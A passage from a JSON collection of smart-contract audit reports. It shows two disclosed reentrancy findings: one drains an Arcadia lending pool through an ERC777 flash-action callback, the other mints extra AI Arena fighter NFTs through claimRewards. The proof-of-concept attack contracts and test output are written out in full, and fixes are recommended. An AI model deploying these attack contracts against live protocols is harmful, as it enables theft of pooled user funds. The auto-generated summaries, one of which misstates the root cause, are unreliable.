uint256 usedMargin = IAccount(account).getUsedMargin();\n \n        // Check the different conditions to end the auction.\n        if (collateralValue >= usedMargin || usedMargin == minimumMargin) { \n            // Happy flow: Account is back in a healthy state.\n            // An Account is healthy if the collateral value is equal or greater than the used margin.\n            // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.\n            ILendingPool(creditor).settleLiquidationHappyFlow(account, startDebt, minimumMargin, msg.sender);\n        } else if (collateralValue == 0) {\n            // Unhappy flow: All collateral is sold.\n            ILendingPool(creditor).settleLiquidationUnhappyFlow(account, startDebt, minimumMargin, msg.sender);\n        }\n\t\t\t\t...\n\t\t\t\t \n\t\t\t\t\n        return true;\n    }\n```\n\nExecuting the `settleLiquidationUnhappyFlow()` will burn ALL the remaining debt (`balanceOf[account]` will return all the remaining balance of debt tokens for the account), and the liquidation will be finished, calling `_endLiquidation()` and leaving the account with 99 tokens of collateral and a 0 amount of debt (and the `actionTarget` with ALL the borrowed funds taken from the flash action).\n\n```solidity\n// LendingPool.sol\n\nfunction settleLiquidationUnhappyFlow(\n        address account,\n        uint256 startDebt,\n        uint256 minimumMargin_,\n        address terminator\n    ) external whenLiquidationNotPaused onlyLiquidator processInterests {\n        ...\n\n        // Any remaining debt that was not recovered during the auction must be written off.\n        // Depending on the size of the remaining debt, different stakeholders will be impacted.\n        uint256 debtShares = balanceOf[account];\n        uint256 openDebt = convertToAssets(debtShares);\n        uint256 badDebt;\n        ...\n\n        // Remove the remaining debt from the Account now that it is written off from the liquidation incentives/Liquidity Providers.\n        _burn(account, debtShares);\n        realisedDebt -= openDebt;\n        emit Withdraw(msg.sender, account, account, openDebt, debtShares);\n\n        _endLiquidation();\n\n        emit AuctionFinished(\n            account, address(this), startDebt, initiationReward, terminationReward, liquidationPenalty, badDebt, 0\n        );\n    }\n```\n\nAfter the `actionTarget`'s ERC777 callback execution, the execution flow will return to the initially called `flashAction()` function, and the final `IAccount(account).flashActionByCreditor()` function will be called, which will pass all the health checks due to the fact that all the debt from the account was burnt:\n\n```solidity\n// LendingPool.sol\n\nfunction flashAction(\n        uint256 amountBorrowed,\n        address account,\n        address actionTarget, \n        bytes calldata actionData,\n        bytes3 referrer\n    ) external whenBorrowNotPaused processInterests {\n        \n\t\t\t\t... \n \n        // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)\n        // to execute one or more actions (swap, deposit, mint...).\n        // Next the action Target will deposit any of the remaining funds or any of the recipient token\n        // resulting from the actions back into the Account.\n        // As last step, after all assets are deposited back into the Account a final health check is done:\n        // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).\n        // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.\n        {\n            uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n            if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n        }\n \n        ... \n    }\n```\n\n```solidity\n// AccountV1.sol\n\nfunction flashActionByCreditor(address actionTarget, bytes calldata actionData)\n        external\n        nonReentrant\n        notDuringAuction\n        updateActionTimestamp\n        returns (uint256 accountVersion)\n    {\n        \n\t\t\t\t...\n\n        // Account must be healthy after actions are executed.\n        if (isAccountUnhealthy()) revert AccountErrors.AccountUnhealthy();\n\n        ...\n    }\n```\n\n## Proof of Concept\n\nThe following proof of concept illustrates how the previously described attack  can take place. Follow the steps in order to reproduce it:\n\n1. Create a `ERC777Mock.sol` file in `lib/accounts-v2/test/utils/mocks/tokens` and paste the code found in [this github gist](https://gist.github.com/0xadrii/3677f0b5dfb9dcfe6b8b3953115d03f5).\n2. Import the ERC777Mock and change the MockOracles, MockERC20 and Rates structs in `lib/accounts-v2/test/utils/Types.sol` to add an additional `token777ToUsd`, `token777` of type ERC777Mock and token777ToUsd rate:\n    \n    ```solidity\n    import \"../utils/mocks/tokens/ERC777Mock.sol\"; // <----- Import this\n    \n    ...\n    \n    struct MockOracles {\n        ArcadiaOracle stable1ToUsd;\n        ArcadiaOracle stable2ToUsd;\n        ArcadiaOracle token1ToUsd;\n        ArcadiaOracle token2ToUsd;\n        ArcadiaOracle token3ToToken4;\n        ArcadiaOracle token4ToUsd;\n        ArcadiaOracle token777ToUsd; // <----- Add this\n        ArcadiaOracle nft1ToToken1;\n        ArcadiaOracle nft2ToUsd;\n        ArcadiaOracle nft3ToToken1;\n        ArcadiaOracle sft1ToToken1;\n        ArcadiaOracle sft2ToUsd;\n    }\n    \n    struct MockERC20 {\n        ERC20Mock stable1;\n        ERC20Mock stable2;\n        ERC20Mock token1;\n        ERC20Mock token2;\n        ERC20Mock token3;\n        ERC20Mock token4;\n        ERC777Mock token777; // <----- Add this\n    }\n    \n    ...\n    \n    struct Rates {\n        uint256 stable1ToUsd;\n        uint256 stable2ToUsd;\n        uint256 token1ToUsd;\n        uint256 token2ToUsd;\n        uint256 token3ToToken4;\n        uint256 token4ToUsd;\n        uint256 token777ToUsd; // <----- Add this\n        uint256 nft1ToToken1;\n        uint256 nft2ToUsd;\n        uint256 nft3ToToken1;\n        uint256 sft1ToToken1;\n        uint256 sft2ToUsd;\n    }\n    ```\n    \n3. Replace the contents inside `lib/accounts-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/2eab11990f47385b584d6405cafa1d08).\n4. To finish the setup, replace the file found in `lending-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/eeac07109792c24268a00ac8e4b3339d).\n5. For the actual proof of concept, create a `Poc.t.sol` file in `test/fuzz/LendingPool` and paste the following code. The code contains the proof of concept test, as well as the action target implementation:\n    \n    ```solidity\n    \n    /**\n     * Created by Pragma Labs\n     * SPDX-License-Identifier: BUSL-1.1\n     */\n    pragma solidity 0.8.22;\n    \n    import { LendingPool_Fuzz_Test } from \"./_LendingPool.fuzz.t.sol\";\n    \n    import { ActionData, IActionBase } from \"../../../lib/accounts-v2/src/interfaces/IActionBase.sol\";\n    import { IPermit2 } from \"../../../lib/accounts-v2/src/interfaces/IPermit2.sol\";\n    \n    /// @notice Proof of Concept - Arcadia\n    contract Poc is LendingPool_Fuzz_Test {\n    \n        /////////////////////////////////////////////////////////////////\n        //                        TEST CONTRACTS                       //\n        /////////////////////////////////////////////////////////////////\n    \n        ActionHandler internal actionHandler;\n        bytes internal callData;\n    \n        /////////////////////////////////////////////////////////////////\n        //                          SETUP                              //\n        /////////////////////////////////////////////////////////////////\n    \n        function setUp() public override {\n            // Setup pool test\n            LendingPool_Fuzz_Test.setUp();\n    \n            // Deploy action handler\n            vm.prank(users.creatorAddress);\n            actionHandler = new ActionHandler(address(liquidator), address(proxyAccount));\n    \n            // Set origination fee\n            vm.prank(users.creatorAddress);\n            pool.setOriginationFee(100); // 1%\n    \n            // Transfer some tokens to actiontarget to perform liquidation repayment and approve tokens to be transferred to pool \n            vm.startPrank(users.liquidityProvider);\n            mockERC20.token777.transfer(address(actionHandler), 1 ether);\n            mockERC20.token777.approve(address(pool), type(uint256).max);\n    \n            // Deposit 100 erc777 tokens into pool\n            vm.startPrank(address(srTranche));\n            pool.depositInLendingPool(100 ether, users.liquidityProvider);\n            assertEq(mockERC20.token777.balanceOf(address(pool)), 100 ether);\n    \n            // Approve creditor from actiontarget for bid payment\n            vm.startPrank(address(actionHandler));\n            mockERC20.token777.approve(address(pool), type(uint256).max);\n    \n        }\n    \n        /////////////////////////////////////////////////////////////////\n        //                           POC                               //\n        /////////////////////////////////////////////////////////////////\n        /// @notice Test exploiting the reentrancy vulnerability. \n        /// Prerequisites:\n        /// - Create an actionTarget contract that will trigger the attack flow using the ERC777 callback when receiving the \n        ///   borrowed funds in the flash action.\n        /// - Have some liquidity deposited in the pool in order to be able to borrow it\n        /// Attack:\n        /// 1. Open a margin account in the creditor to be exploited.\n        /// 2. Deposit a small amount of collateral. This amount needs to be big enough to cover the `minUsdValue` configured\n        /// in the registry for the given creditor.\n        /// 3. Create the `actionData` for the account's `flashAction()` function. The data contained in it (withdrawData, transferFromOwnerData,\n        /// permit, signature and actionTargetData) can be empty, given that such data is not required for the attack.\n        /// 4. Trigger LendingPool.flashAction(). The execution flow will:\n        ///     a. Mint the flash-actioned debt to the account\n        ///     b. Send the borrowed funds to the action target\n        ///     c. The action target will execute the ERC777 `tokensReceived()` callback, which will:\n        ///        - Trigger Liquidator.liquidateAccount(), which will set the account in an auction state\n        ///        - Trigger Liquidator.bid(). \n     \n        function testVuln_reentrancyInFlashActionEnablesStealingAllProtocolFunds(\n            uint128 amountLoaned,\n            uint112 collateralValue,\n            uint128 liquidity,\n            uint8 originationFee\n        ) public {   \n    \n            //----------            STEP 1            ----------//\n            // Open a margin account\n            vm.startPrank(users.accountOwner);\n            proxyAccount.openMarginAccount(address(pool)); \n            \n            //----------            STEP 2            ----------//\n            // Deposit 1 stable token in the account as collateral.\n            // Note: The creditors's `minUsdValue` is set to 1 * 10 ** 18. Because\n            // value is converted to an 18-decimal number and the asset is pegged to 1 dollar,\n            // depositing an amount of 1 * 10 ** 6 is the actual minimum usd amount so that the \n            // account's collateral value is not considered as 0.\n            depositTokenInAccount(proxyAccount, mockERC20.stable1, 1 * 10 ** 6);\n            assertEq(proxyAccount.getCollateralValue(), 1 * 10 ** 18);\n    \n            //----------            STEP 3            ----------//\n            // Create empty action data. The action handler won't withdraw/deposit any asset from the account \n            // when the `flashAction()` callback in the account is triggered. Hence, action data will contain empty elements.\n            callData = _buildActionData();\n    \n            // Fetch balances from the action handler (who will receive all the borrowed funds from the flash action)\n            // as well as the pool. \n            // Action handler balance initially has 1 token of token777 (given initially on deployment)\n            assertEq(mockERC20.token777.balanceOf(address(actionHandler)), 1 * 10 ** 18);\n            uint256 liquidityPoolBalanceBefore =  mockERC20.token777.balanceOf(address(pool));\n            uint256 actionHandlerBalanceBefore =  mockERC20.token777.balanceOf(address(actionHandler));\n            // Pool initially has 100 tokens of token777 (deposited by the liquidity provider in setUp())\n            assertEq(mockERC20.token777.balanceOf(address(pool)), 100 * 10 ** 18);\n    \n            //----------            STEP 4            ----------//\n            // Step 4. Trigger the flash action.\n            vm.startPrank(users.accountOwner);\n    \n            pool.flashAction(100 ether , address(proxyAccount), address(actionHandler), callData, emptyBytes3);\n            vm.stopPrank();\n     \n            \n            //----------       FINAL ASSERTIONS       ----------//\n    \n            // Action handler (who is the receiver of the borrowed funds in the flash action) has succesfully obtained 100 tokens from \n            //the pool, and in the end it has nearly 101 tokens (initially it had 1 token, plus the 100 tokens stolen \n            // from the pool minus the small amount required to pay for the bid)\n            assertGt(mockERC20.token777.balanceOf(address(actionHandler)), 100 * 10 ** 18);\n    \n            // On the other hand, pool has lost nearly all of its balance, only remaining the small amount paid from the \n            // action handler in order to bid\n            assertLt(mockERC20.token777.balanceOf(address(pool)), 0.05 * 10 ** 18);\n        \n        } \n    \n        /// @notice Internal function to build the `actionData` payload needed to execute the `flashActionByCreditor()` \n        /// callback when requesting a flash action\n        function _buildActionData() internal returns(bytes memory) {\n            ActionData memory emptyActionData;\n            address[] memory to;\n            bytes[] memory data;\n            bytes memory actionTargetData = abi.encode(emptyActionData, to, data);\n            IPermit2.PermitBatchTransferFrom memory permit;\n            bytes memory signature;\n            return abi.encode(emptyActionData, emptyActionData, permit, signature, actionTargetData);\n        }\n    }\n    \n    /// @notice ERC777Recipient interface\n    interface IERC777Recipient {\n       \n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external;\n    }\n    \n     /// @notice Liquidator interface\n    interface ILiquidator {\n        function liquidateAccount(address account) external;\n        function bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external;\n    }\n    \n     /// @notice actionHandler contract that will trigger the attack via ERC777's `tokensReceived()` callback\n    contract ActionHandler is IERC777Recipient, IActionBase {\n    \n        ILiquidator public immutable liquidator;\n        address public immutable account;\n        uint256 triggered;\n    \n        constructor(address _liquidator, address _account) {\n            liquidator = ILiquidator(_liquidator);\n            account = _account;\n        }  \n    \n    \t\t /// @notice ERC777 callback function\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n            // Only trigger the callback once (avoid triggering it while receiving funds in the setup + when receiving final funds)\n            if(triggered == 1) {\n                triggered = 2;\n                liquidator.liquidateAccount(account);\n                uint256[] memory askedAssetAmounts = new uint256[](1);\n                askedAssetAmounts[0] = 1; // only ask for 1 wei of token so that we repay a small share of the debt\n                liquidator.bid(account, askedAssetAmounts, true);\n            }\n    \t\t\t\tunchecked{\n    \t        triggered++;\n    \t\t\t\t}\n        }\n    \n        function executeAction(bytes calldata actionTargetData) external returns (ActionData memory) {\n            ActionData memory data;\n            return data;\n        }\n    \n    }\n    ```\n    \n6. Execute the proof of concept with the following command (being inside the `lending-v2` folder): `forge test --mt testVuln_reentrancyInFlashActionEnablesStealingAllProtocolFunds`\n\n## Impact\n\nThe impact for this vulnerability is high.  All funds deposited in creditors with ERC777 tokens as the underlying asset can be drained.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L567\n\n## Tool used\n\nManual Review, foundry\n\n## Recommendation\n\nThis attack is possible because the `getCollateralValue()` function returns a 0 collateral value due to the `minUsdValue` mentioned before not being reached after executing the bid. The Liquidator’s `_settleAuction()` function then believes the collateral held in the account is 0.\n\nIn order to mitigate the issue, consider fetching the actual real collateral value inside `_settleAuction()` even if it is less than the `minUsdValue` held in the account, so that the function can properly check if the full collateral was sold or not.\n\n```solidity\n// Liquidator.sol\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n        internal\n        returns (bool success)\n    {\n        ...\n\n        uint256 collateralValue = IAccount(account).getCollateralValue(); // <----- Fetch the REAL collateral value instead of reducing it to 0 if `minUsdValue` is not reached\n        \n \n        ...\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid: high(2)\n\n\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/lending-v2/pull/133.\n\n**Thomas-Smets**\n\nFix consists out of two PR's:\n- accounts: https://github.com/arcadia-finance/accounts-v2/pull/173\n- lending: https://github.com/arcadia-finance/lending-v2/pull/133",
      "summary": "\nThe report highlights a vulnerability in the Arcadia protocol where it is possible to drain a liquidity pool/creditor if the pool's asset is an ERC777 token by triggering a reentrancy flow using flash actions. This can be done by creating an account and depositing collateral near the configured minimum USD value. Then, by triggering a flash action and using a contract as the `actionTarget`, the account can be liquidated and the bidder can bid for the account, causing the collateral value to decrease and making the creditor's `settleLiquidationUnhappyFlow()` function be called. The vulnerability has been fixed by the protocol team in two PRs.",
      "report_date": {},
      "contest_prize_txt": "53000 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/137",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 1.5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/153",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "137",
      "slug": "h-2-reentrancy-in-flashaction-allows-draining-liquidity-pools-sherlock-arcadia-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Arcadia",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Arcadia",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "32190",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 33,
      "protocol_id": "1285",
      "title": "[H-08] Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on the `claimRewards() function`",
      "content": "\nWhen a fighting round ends, winners for the current round get picked and allocated respective rewards. These rewards are fighter NFTs that can be claimed by such winners. When you claim your rewards for a round or several rounds, the `numRoundsClaimed` state variable which stores the number of rounds you've claimed for gets updated to reflect your claim and each winner can only ever claim up to the amounts they win for each given round. That means if you try to batch-claim for two given rounds for which you won 2 fighter NFTs, your NFT count after the claim should be whatever your current balance of NFT is plus 2 fighter NFTs.\n\nThe issue here is that there's a way to mint additional fighter NFTs on top of the fighter NFTs you're owed for winning even though the `claimRewards` function has implemented a decent system to prevent over-claims. For one, it's relatively complex to spoof a call pretending to be the `_mergingPoolAddress` to mint but a malicious user doesn't need to worry too much about that to mint more fighters; they just need to leverage using a smart contract for engineering a simple reentrancy.\n\n### Proof of Concept\n\nConsider this call path that allows a malicious user to reach this undesired state:\n\n1.  In-session fight round gets finalized.\n2.  An admin picks winners for the just finalized round.\n3.  Alice, one of the winners is entitled to 2 fighter NFTs just like Bob and decides to claim rewards for the rounds she participated in but keep in mind she joined the game with a smart contract.\n4.  Alice calls `claimRewards` supplying the args `(string[] calldata modelURIs, string[] calldata modelTypes, uint256[2][] calldata customAttributes)`\n5.  Those are valid arguments, hence the loop proceeds to make 2 NFT mints to her address.\n6.  Her address, being a smart contract manages to reenter the call to mint additional NFTs.\n7.  Alice ends up with more fighter NFTs instead of 2. Bob, who is an EOA gets the 2 NFTs he's owed but Alice has managed to gain more.\n\nThe root cause of this issue stems from the `roundId`. The amount of times you can reenter the `claimRewards` function depends on the `roundId`. So let's say the `roundId` is 3, it mints 6 NFTs:\n\n*   First loop mints once\n*   Reenter mints the second time\n*   Reenter again mints the third time\n*   Cannot reenter anymore\n*   Control is released so the call goes back to the second loop & finishes the mint\n*   Call goes back & finishes the second and third mint\n*   Alice or malicious caller ends up with 6 NFTs instead of 3\n\nHere's a POC to show one such attack path in the code\nPlace the code in the `MergingPool.t.sol` test contract and do the setup: `testReenterPOC` is the attack POC test\n\nAttack contract:\n\n<details>\n\n```js\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\ncontract Attack is IERC721Receiver {\n    \n    address owner;\n    uint256 tickets = 0;\n    MergingPool mergingPool;\n    FighterFarm fighterFarm;\n\n    constructor(address mergingPool_, address fighterFarm_) {\n        mergingPool = MergingPool(mergingPool_);\n        fighterFarm = FighterFarm(fighterFarm_);\n        owner = msg.sender;\n    }\n    function reenter() internal {\n        ++tickets;\n        if (tickets < 100) {\n            (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();\n            mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n        }\n    }\n\n    function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {\n        reenter();\n        return IERC721Receiver.onERC721Received.selector;\n    }\n    function attack() public {\n        (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();\n        mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n    } \n\n    function setInformation() public pure returns (string[] memory, string[] memory, uint256[2][] memory) {\n        string[] memory _modelURIs = new string[](3);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[2] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        string[] memory _modelTypes = new string[](3);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        _modelTypes[2] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](3);\n        _customAttributes[0][0] = uint256(1);\n        _customAttributes[0][1] = uint256(80);\n        _customAttributes[1][0] = uint256(1);\n        _customAttributes[1][1] = uint256(80);\n        _customAttributes[2][0] = uint256(1);\n        _customAttributes[2][1] = uint256(80);\n\n        return (_modelURIs, _modelTypes, _customAttributes);\n    }  \n}\n```\n\n```js\n    function testReenterPOC() public {\n\n        address Bob = makeAddr(\"Bob\");\n        Attack attacker = new Attack(address(_mergingPoolContract), address(_fighterFarmContract));\n        \n        _mintFromMergingPool(address(attacker));\n        _mintFromMergingPool(Bob);\n\n        assertEq(_fighterFarmContract.ownerOf(0), address(attacker));\n        assertEq(_fighterFarmContract.ownerOf(1), Bob);\n\n        uint256[] memory _winners = new uint256[](2);\n        _winners[0] = 0;\n        _winners[1] = 1;\n\n         // winners of roundId 0 are picked\n        _mergingPoolContract.pickWinner(_winners);\n        assertEq(_mergingPoolContract.isSelectionComplete(0), true);  \n        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == address(attacker), true);\n        // winner matches ownerOf tokenId\n        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == Bob, true);\n\n        string[] memory _modelURIs = new string[](2);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        \n        string[] memory _modelTypes = new string[](2);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](2);\n        _customAttributes[0][0] = uint256(1);\n        _customAttributes[0][1] = uint256(80);\n        _customAttributes[1][0] = uint256(1);\n        _customAttributes[1][1] = uint256(80);\n        // winners of roundId 1 are picked\n\n        uint256 numberOfRounds = _mergingPoolContract.roundId();\n        console.log(\"Number of Rounds: \", numberOfRounds);\n\n        _mergingPoolContract.pickWinner(_winners);\n        _mergingPoolContract.pickWinner(_winners);\n\n        console.log(\"------------------------------------------------------\");\n\n        console.log(\"Balance of attacker (Alice) address pre-claim rewards: \", _fighterFarmContract.balanceOf(address(attacker)));\n        // console.log(\"Balance of Bob address pre-claim rewards: \", _fighterFarmContract.balanceOf(Bob));\n\n\n        uint256 numRewardsForAttacker = _mergingPoolContract.getUnclaimedRewards(address(attacker));\n        \n        // uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);\n\n        console.log(\"------------------------------------------------------\");\n\n        console.log(\"Number of unclaimed rewards attacker (Alice) address has a claim to: \", numRewardsForAttacker);\n        // console.log(\"Number of unclaimed rewards Bob address has a claim to: \", numRewardsForBob);\n        \n        // vm.prank(Bob);\n        // _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n\n        vm.prank(address(attacker));\n        attacker.attack();\n\n        uint256 balanceOfAttackerPostClaim = _fighterFarmContract.balanceOf(address(attacker));\n\n        console.log(\"------------------------------------------------------\");\n        console.log(\"Balance of attacker (Alice) address post-claim rewards: \", balanceOfAttackerPostClaim);\n        // console.log(\"Balance of Bob address post-claim rewards: \", _fighterFarmContract.balanceOf(Bob));\n\n    }\n```\n</details>\n\nMalicious user leveraging reentrancy test result:\n\n<details>\n\n```js\n[PASS] testReenterPOC() (gas: 3999505)\nLogs:\n  Number of Rounds:  1\n  ------------------------------------------------------\n  Balance of attacker (Alice) address pre-claim rewards:  1\n  ------------------------------------------------------\n  Number of unclaimed rewards attacker (Alice) address has a claim to:  3\n  ------------------------------------------------------\n  Balance of attacker (Alice) address post-claim rewards:  7\n```\n\nNon-malicious users test POC:\n\n```js\nfunction testNormalEOAClaim() public {\n        _mintFromMergingPool(_ownerAddress);\n        _mintFromMergingPool(_DELEGATED_ADDRESS);\n        \n        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);\n        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);\n\n        uint256[] memory _winners = new uint256[](2);\n        _winners[0] = 0;\n        _winners[1] = 1;\n\n        // winners of roundId 0 are picked\n        _mergingPoolContract.pickWinner(_winners);\n        assertEq(_mergingPoolContract.isSelectionComplete(0), true);\n        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);\n        // winner matches ownerOf tokenId\n        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);\n\n        string[] memory _modelURIs = new string[](2);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n\n        string[] memory _modelTypes = new string[](2);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](2);\n        _customAttributes[0][0] = uint256(1);\n        _customAttributes[0][1] = uint256(80);\n        _customAttributes[1][0] = uint256(1);\n        _customAttributes[1][1] = uint256(80);\n        // winners of roundId 1 are picked\n\n        uint256 numberOfRounds = _mergingPoolContract.roundId();\n        console.log(\"Number of Rounds: \", numberOfRounds);\n\n        _mergingPoolContract.pickWinner(_winners);\n\n        console.log(\"Balance of owner address pre-claim rewards: \", _fighterFarmContract.balanceOf(address(this)));\n        console.log(\"Balance of delegated address pre-claim rewards: \", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));\n\n\n        uint256 numRewardsForWinner = _mergingPoolContract.getUnclaimedRewards(_ownerAddress);\n        \n        uint256 numRewardsForDelegated = _mergingPoolContract.getUnclaimedRewards(_DELEGATED_ADDRESS);\n        // emit log_uint(numRewardsForWinner);\n\n        console.log(\"Number of unclaimed rewards owner address has a claim to: \", numRewardsForWinner);\n        console.log(\"Number of unclaimed rewards delegated address has a claim to: \", numRewardsForDelegated);\n\n        // winner claims rewards for previous roundIds\n        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n        vm.prank(_DELEGATED_ADDRESS);\n        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n\n        console.log(\"Balance of owner address post-claim rewards: \", _fighterFarmContract.balanceOf(address(this)));\n        console.log(\"Balance of delegated address post-claim rewards: \", _fighterFarmContract.balanceOf(_DELEGATED_ADDRESS));\n    }\n```\n</details>\n\nNon-malicious users doing a normal claim result:\n\n```js\n[PASS] testNormalEOAClaim() (gas: 2673123)\nLogs:\n  Number of Rounds:  1\n  Balance of owner address pre-claim rewards:  1\n  Balance of delegated address pre-claim rewards:  1\n  Number of unclaimed rewards owner address has a claim to:  2\n  Number of unclaimed rewards delegated address has a claim to:  2\n  Balance of owner address post-claim rewards:  3\n  Balance of delegated address post-claim rewards:  3\n```\n\n### Recommended Mitigation Steps\n\nUse a `nonReentrant` modifier for the `claimRewards` function.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37#issuecomment-1975461186)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/6\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/28), [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/47), and [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/27).\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report discusses a vulnerability in the AI Arena smart contract. The contract allows winners of a fighting round to claim rewards in the form of fighter NFTs. However, there is a flaw in the code that allows a malicious user to mint additional NFTs on top of the ones they are owed. This can be achieved by using a smart contract to reenter the `claimRewards` function multiple times, resulting in the user receiving more NFTs than they should. This issue is caused by the `roundId` variable, which determines the number of times a user can reenter the function. By manipulating this variable, a malicious user can gain more NFTs than they are entitled to. A proof of concept is provided to demonstrate this attack. \n\nTo mitigate this issue, the contract should use a `nonReentrant` modifier for the `claimRewards` function. This will prevent users from reentering the function multiple times and gaining additional NFTs. The AI Arena team has confirmed this vulnerability and implemented the recommended mitigation steps. The issue has been resolved and the contract is now secure.",
      "report_date": {},
      "contest_prize_txt": "60500",
      "contest_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "sponsor_name": "AI Arena",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 2,
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/37",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "328",
      "slug": "h-08-player-can-mint-more-fighter-nfts-during-claim-of-rewards-by-leveraging-reentrancy-on-the-claimrewards-function-code4rena-ai-arena-ai-arena-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "AI Arena",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "AI Arena",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 2565.770183912887
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "30523",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "1238",
      "title": "[H-03] An attacker can hijack any ERC1155 token he rents due to a design issue in reNFT via reentrancy exploitation",
